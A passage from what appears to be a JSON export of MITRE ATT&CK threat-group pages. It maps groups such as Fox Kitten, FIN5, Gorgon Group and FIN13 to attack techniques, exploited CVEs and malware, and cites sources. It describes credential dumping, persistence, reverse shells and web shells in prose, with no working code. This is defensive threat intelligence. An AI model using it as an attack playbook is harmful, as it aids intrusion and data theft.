CrunchBase.[1] Enterprise T1593 .001 Search Open Websites/Domains: Social Media EXOTIC LILY has copied data from social media sites to impersonate targeted individuals.[1] Enterprise T1594 Search Victim-Owned Websites EXOTIC LILY has used contact forms on victim websites to generate phishing e-mails.[1] Enterprise T1608 .001 Stage Capabilities: Upload Malware EXOTIC LILY has uploaded malicious payloads to file-sharing services including TransferNow, TransferXL, WeTransfer, and OneDrive.[1] Enterprise T1204 .001 User Execution: Malicious Link EXOTIC LILY has used malicious links to lure users into executing malicious payloads.[1] .002 User Execution: Malicious File EXOTIC LILY has gained execution through victims clicking on malicious LNK files contained within ISO files, which can execute hidden DLLs within the ISO.[1][2] Enterprise T1102 Web Service EXOTIC LILY has used file-sharing services including WeTransfer, TransferNow, and OneDrive to deliver payloads.[1] Software ID Name References Techniques S0534 Bazar [1] Account Discovery: Domain Account, Account Discovery: Local Account, Application Layer Protocol: Web Protocols, BITS Jobs, Boot or Logon Autostart Execution: Winlogon Helper DLL, Boot or Logon Autostart Execution: Shortcut Modification, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Data from Local System, Deobfuscate/Decode Files or Information, Domain Trust Discovery, Dynamic Resolution: Domain Generation Algorithms, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Fallback Channels, File and Directory Discovery, Impair Defenses: Disable or Modify Tools, Indicator Removal: Clear Persistence, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Masquerading: Masquerade Task or Service, Masquerading: Double File Extension, Multi-Stage Channels, Native API, Network Share Discovery, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Dynamic API Resolution, Obfuscated Files or Information: Software Packing, Phishing: Spearphishing Link, Process Discovery, Process Injection, Process Injection: Process Doppelg\u00e4nging, Process Injection: Process Hollowing, Query Registry, Remote System Discovery, Scheduled Task/Job: Scheduled Task, Software Discovery: Security Software Discovery, Software Discovery, Subvert Trust Controls: Code Signing, System Information Discovery, System Location Discovery: System Language Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Time Discovery, User Execution: Malicious Link, Virtualization/Sandbox Evasion, Virtualization/Sandbox Evasion: Time Based Evasion, Web Service, Windows Management Instrumentation S1039 Bumblebee [1] Abuse Elevation Control Mechanism: Bypass User Account Control, Archive Collected Data, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Data Encoding: Standard Encoding, Data from Local System, Debugger Evasion, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, Fallback Channels, Indicator Removal: File Deletion, Ingress Tool Transfer, Inter-Process Communication: Component Object Model, Masquerading: Match Legitimate Resource Name or Location, Native API, Obfuscated Files or Information, Phishing: Spearphishing Link, Phishing: Spearphishing Attachment, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Asynchronous Procedure Call, Process Injection, Query Registry, Scheduled Task/Job: Scheduled Task, Shared Modules, Software Discovery: Security Software Discovery, System Binary Proxy Execution: Odbcconf, System Binary Proxy Execution: Rundll32, System Information Discovery, System Owner/User Discovery, User Execution: Malicious Link, User Execution: Malicious File, Virtualization/Sandbox Evasion: System Checks, Virtualization/Sandbox Evasion: Time Based Evasion, Virtualization/Sandbox Evasion, Web Service, Windows Management Instrumentation References Stolyarov, V. (2022, March 17). Exposing initial access broker with ties to Conti. Retrieved August 18, 2022. Merriman, K. and Trouerbach, P. (2022, April 28). This isn't Optimus Prime's Bumblebee but it's Still Transforming. Retrieved August 22, 2022. "
},
{
"id": 192,
"title": "RTM, Group G0048",
"path": "/groups/G0048/index.html",
"content": " RTM RTM is a cybercriminal group that has been active since at least 2015 and is primarily interested in users of remote banking systems in Russia and neighboring countries. The group uses a Trojan by the same name (RTM). [1] ID: G0048 Contributors: Oleg Skulkin, Group-IB Version: 1.1 Created: 31 May 2017 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder RTM has used Registry run keys to establish persistence for the RTM Trojan and other tools, such as a modified version of TeamViewer remote desktop software.[1][2] Enterprise T1189 Drive-by Compromise RTM has distributed its malware via the RIG and SUNDOWN exploit kits, as well as online advertising network Yandex.Direct.[1][3] Enterprise T1574 .001 Hijack Execution Flow: DLL RTM has used search order hijacking to force TeamViewer to load a malicious DLL.[2] Enterprise T1566 .001 Phishing: Spearphishing Attachment RTM has used spearphishing attachments to distribute its malware.[2] Enterprise T1219 .002 Remote Access Tools: Remote Desktop Software RTM has used a modified version of TeamViewer and Remote Utilities for remote access.[2] Enterprise T1204 .002 User Execution: Malicious File RTM has attempted to lure victims into opening e-mail attachments to execute malicious code.[2] Enterprise T1102 .001 Web Service: Dead Drop Resolver RTM has used an RSS feed on Livejournal to update a list of encrypted C2 server names.[1] Software ID Name References Techniques S0148 RTM [1] Abuse Elevation Control Mechanism: Bypass User Account Control, Application Layer Protocol: Web Protocols, Automated Collection, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Clipboard Data, Command and Scripting Interpreter: Windows Command Shell, Dynamic Resolution, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Indicator Removal: Clear Persistence, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Inter-Process Communication: Dynamic Data Exchange, Masquerading: Masquerade Task or Service, Masquerading, Modify Registry, Native API, Non-Standard Port, Obfuscated Files or Information: Compression, Obfuscated Files or Information, Peripheral Device Discovery, Phishing: Spearphishing Attachment, Process Discovery, Remote Access Tools, Scheduled Task/Job: Scheduled Task, Screen Capture, Software Discovery: Security Software Discovery, Software Discovery, Subvert Trust Controls: Code Signing, Subvert Trust Controls: Install Root Certificate, System Binary Proxy Execution: Rundll32, System Information Discovery, System Owner/User Discovery, System Time Discovery, User Execution: Malicious File, Virtualization/Sandbox Evasion, Web Service: Dead Drop Resolver References Faou, M. and Boutin, J. (2017, February). Read The Manual: A Guide to the RTM Banking Trojan. Retrieved March 9, 2017. Skulkin, O. (2019, August 5). Following the RTM Forensic examination of a computer infected with a banking trojan. Retrieved May 11, 2020. ESET Research. (2019, April 30). Buhtrap backdoor and Buran ransomware distributed via major advertising platform. Retrieved May 11, 2020. "
},
{
"id": 193,
"title": "BlackOasis, Group G0063",
"path": "/groups/G0063/index.html",
"content": " BlackOasis BlackOasis is a Middle Eastern threat group that is believed to be a customer of Gamma Group. The group has shown interest in prominent figures in the United Nations, as well as opposition bloggers, activists, regional news correspondents, and think tanks. [1] [2] A group known by Microsoft as NEODYMIUM is reportedly associated closely with BlackOasis operations, but evidence that the group names are aliases has not been identified. [3] ID: G0063 Version: 1.0 Created: 18 April 2018 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1027 Obfuscated Files or Information BlackOasis's first stage shellcode contains a NOP sled with alternative instructions that was likely designed to bypass antivirus tools.[1] References Kaspersky Lab's Global Research & Analysis Team. (2017, October 16). BlackOasis APT and new targeted attacks leveraging zero-day exploit. Retrieved February 15, 2018. Kaspersky Lab's Global Research & Analysis Team. (2017, August 8). APT Trends report Q2 2017. Retrieved February 15, 2018. Bing, C. (2017, October 16). Middle Eastern hacking group is using FinFisher malware to conduct international espionage. Retrieved February 15, 2018. "
},
{
"id": 194,
"title": "Fox Kitten, UNC757, Parisite, Pioneer Kitten, RUBIDIUM, Lemon Sandstorm, Group G0117",
"path": "/groups/G0117/index.html",
"content": " Fox Kitten Fox Kitten is threat actor with a suspected nexus to the Iranian government that has been active since at least 2017 against entities in the Middle East, North Africa, Europe, Australia, and North America. Fox Kitten has targeted multiple industrial verticals including oil and gas, technology, government, defense, healthcare, manufacturing, and engineering.[1][2][3][4] ID: G0117 \u24d8 Associated Groups: UNC757, Parisite, Pioneer Kitten, RUBIDIUM, Lemon Sandstorm Version: 2.0 Created: 21 December 2020 Last Modified: 08 January 2024 Version Permalink Live Version Associated Group Descriptions Name Description UNC757 [5][2] Parisite [3][1][2] Pioneer Kitten [2][5] RUBIDIUM [6] Lemon Sandstorm [6] Techniques Used Domain ID Name Use Enterprise T1087 .001 Account Discovery: Local Account Fox Kitten has accessed ntuser.dat and UserClass.dat on compromised hosts.[5] .002 Account Discovery: Domain Account Fox Kitten has used the Softerra LDAP browser to browse documentation on service accounts.[5] Enterprise T1560 .001 Archive Collected Data: Archive via Utility Fox Kitten has used 7-Zip to archive data.[5] Enterprise T1217 Browser Information Discovery Fox Kitten has used Google Chrome bookmarks to identify internal resources and assets.[5] Enterprise T1110 Brute Force Fox Kitten has brute forced RDP credentials.[4] Enterprise T1059 Command and Scripting Interpreter Fox Kitten has used a Perl reverse shell to communicate with C2.[4] .001 PowerShell Fox Kitten has used PowerShell scripts to access credential data.[5] .003 Windows Command Shell Fox Kitten has used cmd.exe likely as a password changing mechanism.[5] Enterprise T1136 .001 Create Account: Local Account Fox Kitten has created a local user account with administrator privileges.[4] Enterprise T1555 .005 Credentials from Password Stores: Password Managers Fox Kitten has used scripts to access credential information from the KeePass database.[5] Enterprise T1530 Data from Cloud Storage Fox Kitten has obtained files from the victim's cloud storage instances.[5] Enterprise T1213 .005 Data from Information Repositories: Messaging Applications Fox Kitten has accessed victim security and IT environments and Microsoft Teams to mine valuable information.[5] Enterprise T1005 Data from Local System Fox Kitten has searched local system resources to access sensitive documents.[5] Enterprise T1039 Data from Network Shared Drive Fox Kitten has searched network shares to access sensitive documents.[5] Enterprise T1585 Establish Accounts Fox Kitten has created KeyBase accounts to communicate with ransomware victims.[4][7] .001 Social Media Accounts Fox Kitten has used a Twitter account to communicate with ransomware victims.[4] Enterprise T1546 .008 Event Triggered Execution: Accessibility Features Fox Kitten has used sticky keys to launch a command prompt.[5] Enterprise T1190 Exploit Public-Facing Application Fox Kitten has exploited known vulnerabilities in Fortinet, PulseSecure, and Palo Alto VPN appliances.[1][3][2][5][4] Enterprise T1210 Exploitation of Remote Services Fox Kitten has exploited known vulnerabilities in remote services including RDP.[1][2][4] Enterprise T1083 File and Directory Discovery Fox Kitten has used WizTree to obtain network files and directory listings.[5] Enterprise T1105 Ingress Tool Transfer Fox Kitten has downloaded additional tools including PsExec directly to endpoints.[5] Enterprise T1036 .004 Masquerading: Masquerade Task or Service Fox Kitten has named the task for a reverse proxy lpupdate to appear legitimate.[5] .005 Masquerading: Match Legitimate Resource Name or Location Fox Kitten has named binaries and configuration files svhost and dllhost respectively to appear legitimate.[5] Enterprise T1046 Network Service Discovery Fox Kitten has used tools including NMAP to conduct broad scanning to identify open ports.[5][4] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation Fox Kitten has base64 encoded scripts to avoid detection.[5] .013 Obfuscated Files or Information: Encrypted/Encoded File Fox Kitten has base64 encoded payloads to avoid detection.[5] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory Fox Kitten has used prodump to dump credentials from LSASS.[5] .003 OS Credential Dumping: NTDS Fox Kitten has used Volume Shadow Copy to access credential information from NTDS.[5] Enterprise T1572 Protocol Tunneling Fox Kitten has used protocol tunneling for communication and RDP activity on compromised hosts through the use of open source tools such as ngrok and custom tool SSHMinion.[2][5][4] Enterprise T1090 Proxy Fox Kitten has used the open source reverse proxy tools including FRPC and Go Proxy to establish connections from C2 to local servers.[5][4][7] Enterprise T1012 Query Registry Fox Kitten has accessed Registry hives ntuser.dat and UserClass.dat.[5] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol Fox Kitten has used RDP to log in and move laterally in the target environment.[5][4] .002 Remote Services: SMB/Windows Admin Shares Fox Kitten has used valid accounts to access SMB shares.[5] .004 Remote Services: SSH Fox Kitten has used the PuTTY and Plink tools for lateral movement.[5] .005 Remote Services: VNC Fox Kitten has installed TightVNC server and client on compromised servers and endpoints for lateral movement.[5] Enterprise T1018 Remote System Discovery Fox Kitten has used Angry IP Scanner to detect remote systems.[5] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task Fox Kitten has used Scheduled Tasks for persistence and to load and execute a reverse proxy binary.[5][4] Enterprise T1505 .003 Server Software Component: Web Shell Fox Kitten has installed web shells on compromised hosts to maintain access.[5][4] Enterprise T1552 .001 Unsecured Credentials: Credentials In Files Fox Kitten has accessed files to gain valid credentials.[5] Enterprise T1078 Valid Accounts Fox Kitten has used valid credentials with various services during lateral movement.[5] Enterprise T1102 Web Service Fox Kitten has used Amazon Web Services to host C2.[4] Software ID Name References Techniques S0020 China Chopper [5] Application Layer Protocol: Web Protocols, Brute Force: Password Guessing, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, File and Directory Discovery, Indicator Removal: Timestomp, Ingress Tool Transfer, Network Service Discovery, Obfuscated Files or Information: Software Packing, Server Software Component: Web Shell S0508 ngrok [2] Dynamic Resolution: Domain Generation Algorithms, Exfiltration Over Web Service, Protocol Tunneling, Proxy, Web Service S0556 Pay2Key [1][7] Data Encrypted for Impact, Encrypted Channel: Asymmetric Cryptography, Indicator Removal: File Deletion, Non-Application Layer Protocol, Proxy: Internal Proxy, Service Stop, System Information Discovery, System Network Configuration Discovery S0029 PsExec [5][7] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution References ClearSky. (2020, February 16). Fox Kitten \u2013 Widespread Iranian Espionage-Offensive Campaign. Retrieved December 21, 2020. Orleans, A. (2020, August 31). Who Is PIONEER KITTEN?. Retrieved December 21, 2020. Dragos. (n.d.). PARISITE. Retrieved December 21, 2020. ClearSky. (2020, December 17). Pay2Key Ransomware \u2013 A New Campaign by Fox Kitten. Retrieved December 21, 2020. CISA. (2020, September 15). Iran-Based Threat Actor Exploits VPN Vulnerabilities. Retrieved December 21, 2020. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Check Point. (2020, November 6). Ransomware Alert: Pay2Key. Retrieved January 4, 2021. "
},
{
"id": 195,
"title": "FIN5, Group G0053",
"path": "/groups/G0053/index.html",
"content": " FIN5 FIN5 is a financially motivated threat group that has targeted personally identifiable information and payment card information. The group has been active since at least 2008 and has targeted the restaurant, gaming, and hotel industries. The group is made up of actors who likely speak Russian. [1] [2] [3] ID: G0053 Contributors: Walker Johnson Version: 1.2 Created: 16 January 2018 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1119 Automated Collection FIN5 scans processes on all victim systems in the environment and uses automated scripts to pull back the results.[2] Enterprise T1110 Brute Force FIN5 has has used the tool GET2 Penetrator to look for remote login and hard-coded credentials.[3][2] Enterprise T1059 Command and Scripting Interpreter FIN5 scans processes on all victim systems in the environment and uses automated scripts to pull back the results.[2] Enterprise T1074 .001 Data Staged: Local Data Staging FIN5 scripts save memory dump data into a specific directory on hosts in the victim environment.[2] Enterprise T1133 External Remote Services FIN5 has used legitimate VPN, Citrix, or VNC credentials to maintain access to a victim environment.[1][3][2] Enterprise T1070 .001 Indicator Removal: Clear Windows Event Logs FIN5 has cleared event logs from victims.[2] .004 Indicator Removal: File Deletion FIN5 uses SDelete to clean up the environment and attempt to prevent detection.[2] Enterprise T1588 .002 Obtain Capabilities: Tool FIN5 has obtained and used a customized version of PsExec, as well as use other tools such as pwdump, SDelete, and Windows Credential Editor.[2] Enterprise T1090 .002 Proxy: External Proxy FIN5 maintains access to victim environments by using FLIPSIDE to create a proxy for a backup RDP tunnel.[2] Enterprise T1018 Remote System Discovery FIN5 has used the open source tool Essential NetTools to map the network and build a list of targets.[2] Enterprise T1078 Valid Accounts FIN5 has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment.[1][3][2] Software ID Name References Techniques S0173 FLIPSIDE [2] Protocol Tunneling S0029 PsExec FIN5 uses a customized version of PsExec.[2] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S0006 pwdump [2] OS Credential Dumping: Security Account Manager S0169 RawPOS [3][2] Archive Collected Data: Archive via Custom Method, Create or Modify System Process: Windows Service, Data from Local System, Data Staged: Local Data Staging, Masquerading: Masquerade Task or Service S0195 SDelete [2] Data Destruction, Indicator Removal: File Deletion S0005 Windows Credential Editor [3][2] OS Credential Dumping: LSASS Memory References Scavella, T. and Rifki, A. (2017, July 20). Are you Ready to Respond? (Webinar). Retrieved October 4, 2017. Bromiley, M. and Lewis, P. (2016, October 7). Attacking the Hospitality and Gaming Industries: Tracking an Attacker Around the World in 7 Years. Retrieved October 6, 2017. Higgins, K. (2015, October 13). Prolific Cybercrime Gang Favors Legit Login Credentials. Retrieved October 4, 2017. "
},
{
"id": 196,
"title": "TA459, Group G0062",
"path": "/groups/G0062/index.html",
"content": " TA459 TA459 is a threat group believed to operate out of China that has targeted countries including Russia, Belarus, Mongolia, and others. [1] ID: G0062 Contributors: Valerii Marchuk, Cybersecurity Help s.r.o. Version: 1.1 Created: 18 April 2018 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell TA459 has used PowerShell for execution of a payload.[1] .005 Command and Scripting Interpreter: Visual Basic TA459 has a VBScript for execution.[1] Enterprise T1203 Exploitation for Client Execution TA459 has exploited Microsoft Word vulnerability CVE-2017-0199 for execution.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment TA459 has targeted victims using spearphishing emails with malicious Microsoft Word attachments.[1] Enterprise T1204 .002 User Execution: Malicious File TA459 has attempted to get victims to open malicious Microsoft Word attachment sent via spearphishing.[1] Software ID Name References Techniques S0032 gh0st RAT TA459 has used a Gh0st variant known as PCrat/Gh0st.[1] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, Dynamic Resolution: Fast Flux DNS, Encrypted Channel: Symmetric Cryptography, Encrypted Channel, Hijack Execution Flow: DLL, Indicator Removal: Clear Windows Event Logs, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Non-Application Layer Protocol, Process Discovery, Process Injection, Query Registry, Screen Capture, Shared Modules, System Binary Proxy Execution: Rundll32, System Information Discovery, System Services: Service Execution S0033 NetTraveler [1] Application Window Discovery, Input Capture: Keylogging S0013 PlugX [1] Application Layer Protocol: Web Protocols, Application Layer Protocol: DNS, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Hijack Execution Flow: DLL, Impair Defenses: Disable or Modify System Firewall, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Masquerade Task or Service, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Native API, Network Share Discovery, Non-Application Layer Protocol, Non-Standard Port, Obfuscated Files or Information, Process Discovery, Query Registry, Screen Capture, System Network Connections Discovery, Trusted Developer Utilities Proxy Execution: MSBuild, Virtualization/Sandbox Evasion: System Checks, Web Service: Dead Drop Resolver S0230 ZeroT [1] Abuse Elevation Control Mechanism: Bypass User Account Control, Application Layer Protocol: Web Protocols, Create or Modify System Process: Windows Service, Data Obfuscation: Steganography, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Hijack Execution Flow: DLL, Ingress Tool Transfer, Obfuscated Files or Information: Junk Code Insertion, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information: Encrypted/Encoded File, System Information Discovery, System Network Configuration Discovery References Axel F. (2017, April 27). APT Targets Financial Analysts with CVE-2017-0199. Retrieved February 15, 2018. "
},
{
"id": 197,
"title": "Gorgon Group, Group G0078",
"path": "/groups/G0078/index.html",
"content": " Gorgon Group Gorgon Group is a threat group consisting of members who are suspected to be Pakistan-based or have other connections to Pakistan. The group has performed a mix of criminal and targeted attacks, including campaigns against government organizations in the United Kingdom, Spain, Russia, and the United States. [1] ID: G0078 Version: 1.5 Created: 17 October 2018 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Gorgon Group malware can create a .lnk file and add a Registry Run key to establish persistence.[1] .009 Boot or Logon Autostart Execution: Shortcut Modification Gorgon Group malware can create a .lnk file and add a Registry Run key to establish persistence.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Gorgon Group malware can use PowerShell commands to download and execute a payload and open a decoy document on the victim\u2019s machine.[1] .003 Command and Scripting Interpreter: Windows Command Shell Gorgon Group malware can use cmd.exe to download and execute payloads and to execute commands on the system.[1] .005 Command and Scripting Interpreter: Visual Basic Gorgon Group has used macros in Spearphishing Attachments as well as executed VBScripts on victim machines.[1] Enterprise T1140 Deobfuscate/Decode Files or Information Gorgon Group malware can decode contents from a payload that was Base64 encoded and write the contents to a file.[1] Enterprise T1564 .003 Hide Artifacts: Hidden Window Gorgon Group has used -W Hidden to conceal PowerShell windows by setting the WindowStyle parameter to hidden. [1] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools Gorgon Group malware can attempt to disable security features in Microsoft Office and Windows Defender using the taskkill command.[1] Enterprise T1105 Ingress Tool Transfer Gorgon Group malware can download additional files from C2 servers.[1] Enterprise T1112 Modify Registry Gorgon Group malware can deactivate security mechanisms in Microsoft Office by editing several keys and values under HKCU\\Software\\Microsoft\\Office\\.[1] Enterprise T1106 Native API Gorgon Group malware can leverage the Windows API call, CreateProcessA(), for execution.[1] Enterprise T1588 .002 Obtain Capabilities: Tool Gorgon Group has obtained and used tools such as QuasarRAT and Remcos.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment Gorgon Group sent emails to victims with malicious Microsoft Office documents attached.[1] Enterprise T1055 .002 Process Injection: Portable Executable Injection Gorgon Group malware can download a remote access tool, ShiftyBug, and inject into another process.[1] .012 Process Injection: Process Hollowing Gorgon Group malware can use process hollowing to inject one of its trojans into another process.[1] Enterprise T1204 .002 User Execution: Malicious File Gorgon Group attempted to get users to launch malicious Microsoft Office attachments delivered via spearphishing emails.[1] Software ID Name References Techniques S0336 NanoCore [1] Audio Capture, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: Visual Basic, Encrypted Channel: Symmetric Cryptography, Impair Defenses: Disable or Modify System Firewall, Impair Defenses: Disable or Modify Tools, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information, System Network Configuration Discovery, Video Capture S0385 njRAT [1] Application Layer Protocol: Web Protocols, Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Credentials from Password Stores: Credentials from Web Browsers, Data Encoding: Standard Encoding, Data from Local System, Dynamic Resolution: Fast Flux DNS, Exfiltration Over C2 Channel, File and Directory Discovery, Impair Defenses: Disable or Modify System Firewall, Indicator Removal: File Deletion, Indicator Removal: Clear Persistence, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Non-Standard Port, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Compile After Delivery, Peripheral Device Discovery, Process Discovery, Query Registry, Remote Services: Remote Desktop Protocol, Remote System Discovery, Replication Through Removable Media, Screen Capture, System Information Discovery, System Owner/User Discovery, Video Capture S0262 QuasarRAT [1] Abuse Elevation Control Mechanism: Bypass User Account Control, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Data from Local System, Encrypted Channel: Symmetric Cryptography, Hide Artifacts: Hidden Window, Hide Artifacts: Hidden Files and Directories, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Non-Application Layer Protocol, Non-Standard Port, Proxy, Remote Services: Remote Desktop Protocol, Scheduled Task/Job: Scheduled Task, Subvert Trust Controls: Code Signing, System Information Discovery, System Location Discovery, System Network Configuration Discovery, System Owner/User Discovery, Unsecured Credentials: Credentials In Files, Video Capture S0332 Remcos [1] Abuse Elevation Control Mechanism: Bypass User Account Control, Audio Capture, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Clipboard Data, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, File and Directory Discovery, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information, Process Injection, Proxy, Screen Capture, Video Capture, Virtualization/Sandbox Evasion: System Checks References Falcone, R., et al. (2018, August 02). The Gorgon Group: Slithering Between Nation State and Cybercrime. Retrieved August 7, 2018. "
},
{
"id": 198,
"title": "NEODYMIUM, Group G0055",
"path": "/groups/G0055/index.html",
"content": " NEODYMIUM NEODYMIUM is an activity group that conducted a campaign in May 2016 and has heavily targeted Turkish victims. The group has demonstrated similarity to another activity group called PROMETHIUM due to overlapping victim and campaign characteristics. [1] [2] NEODYMIUM is reportedly associated closely with BlackOasis operations, but evidence that the group names are aliases has not been identified. [3] ID: G0055 Version: 1.0 Created: 16 January 2018 Last Modified: 16 April 2025 Version Permalink Live Version Software ID Name References Techniques S0176 Wingbird [1][2] Boot or Logon Autostart Execution: LSASS Driver, Create or Modify System Process: Windows Service, Exploitation for Privilege Escalation, Hijack Execution Flow: DLL, Indicator Removal: File Deletion, Process Injection, Software Discovery: Security Software Discovery, System Information Discovery, System Services: Service Execution References Microsoft. (2016, December 14). Twin zero-day attacks: PROMETHIUM and NEODYMIUM target individuals in Europe. Retrieved November 27, 2017. Anthe, C. et al. (2016, December 14). Microsoft Security Intelligence Report Volume 21. Retrieved November 27, 2017. Bing, C. (2017, October 16). Middle Eastern hacking group is using FinFisher malware to conduct international espionage. Retrieved February 15, 2018. "
},
{
"id": 199,
"title": "FIN13, Elephant Beetle, Group G1016",
"path": "/groups/G1016/index.html",
"content": " FIN13 FIN13 is a financially motivated cyber threat group that has targeted the financial, retail, and hospitality industries in Mexico and Latin America, as early as 2016. FIN13 achieves its objectives by stealing intellectual property, financial data, mergers and acquisition information, or PII.[1][2] ID: G1016 \u24d8 Associated Groups: Elephant Beetle Contributors: Oren Biderman, Sygnia; Noam Lifshitz, Sygnia Version: 1.0 Created: 27 July 2023 Last Modified: 29 September 2023 Version Permalink Live Version Associated Group Descriptions Name Description Elephant Beetle [2] Techniques Used Domain ID Name Use Enterprise T1134 .003 Access Token Manipulation: Make and Impersonate Token FIN13 has utilized tools such as Incognito V2 for token manipulation and impersonation.[2] Enterprise T1087 Account Discovery FIN13 has enumerated all users and their roles from a victim's main treasury system.[1] .002 Domain Account FIN13 can identify user accounts associated with a Service Principal Name and query Service Principal Names within the domain by utilizing the following scripts: GetUserSPNs.vbs and querySpn.vbs.[1][2] Enterprise T1098 .007 Account Manipulation: Additional Local or Domain Groups FIN13 has assigned newly created accounts the sysadmin role to maintain persistence.[2] Enterprise T1071 .001 Application Layer Protocol: Web Protocols FIN13 has used HTTP requests to chain multiple web shells and to contact actor-controlled C2 servers prior to exfiltrating stolen data.[1][2] Enterprise T1560 .001 Archive Collected Data: Archive via Utility FIN13 has compressed the dump output of compromised credentials with a 7zip binary.[2] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder FIN13 has used Windows Registry run keys such as, HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\hosts to maintain persistence.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell FIN13 has used PowerShell commands to obtain DNS data from a compromised network.[1] .003 Command and Scripting Interpreter: Windows Command Shell FIN13 has leveraged xp_cmdshell and Windows Command Shell to execute commands on a compromised machine. FIN13 has also attempted to leverage the \u2018xp_cmdshell\u2019 SQL procedure to execute remote commands on internal MS-SQL servers.[1][2] .005 Command and Scripting Interpreter: Visual Basic FIN13 has used VBS scripts for code execution on comrpomised machines.[2] Enterprise T1136 .001 Create Account: Local Account FIN13 has created MS-SQL local accounts in a compromised network.[2] Enterprise T1005 Data from Local System FIN13 has gathered stolen credentials, sensitive data such as point-of-sale (POS), and ATM data from a compromised network before exfiltration.[1][2] Enterprise T1565 Data Manipulation FIN13 has injected fraudulent transactions into compromised networks that mimic legitimate behavior to siphon off incremental amounts of money.[2] Enterprise T1074 .001 Data Staged: Local Data Staging FIN13 has utilized the following temporary folders on compromised Windows and Linux systems for their operations prior to exfiltration: C:\\Windows\\Temp and /tmp.[1][2] Enterprise T1140 Deobfuscate/Decode Files or Information FIN13 has utilized certutil to decode base64 encoded versions of custom malware.[1] Enterprise T1587 .001 Develop Capabilities: Malware FIN13 has utilized custom malware to maintain persistence in a compromised environment.[1][2] Enterprise T1190 Exploit Public-Facing Application FIN13 has exploited known vulnerabilities such as CVE-2017-1000486 (Primefaces Application Expression Language Injection), CVE-2015-7450 (WebSphere Application Server SOAP Deserialization Exploit), CVE-2010-5326 (SAP NewWeaver Invoker Servlet Exploit), and EDB-ID-24963 (SAP NetWeaver ConfigServlet Remote Code Execution) to gain initial access.[1][2] Enterprise T1133 External Remote Services FIN13 has gained access to compromised environments via remote access services such as the corporate virtual private network (VPN).[1] Enterprise T1083 File and Directory Discovery FIN13 has used the Windows dir command to enumerate files and directories in a victim's network.[1] Enterprise T1657 Financial Theft FIN13 has observed the victim's software and infrastructure over several months to understand the technical process of legitimate financial transactions, prior to attempting to conduct fraudulent transactions.[2] Enterprise T1589 Gather Victim Identity Information FIN13 has researched employees to target for social engineering attacks.[1] Enterprise T1590 .004 Gather 